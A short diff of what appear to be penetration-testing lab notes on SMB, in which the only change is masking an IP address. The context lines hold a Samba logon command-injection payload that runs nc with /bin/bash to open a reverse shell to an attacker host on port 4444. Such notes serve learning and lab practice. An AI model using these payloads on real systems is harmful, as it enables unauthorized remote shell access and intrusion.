@@ -40,7 +40,7 @@ Step3 => SMB
 
 Connect to null share:
 
-smbclient //10.10.10.3/tmp
+smbclient //10.10.X.X/tmp
 get shell :  logon "./=' nohup nc 10.10.X.X 4444 -e /bin/bash'"
 
 logon "/=`nc 'attack box ip' 4444 -e /bin/bash`"
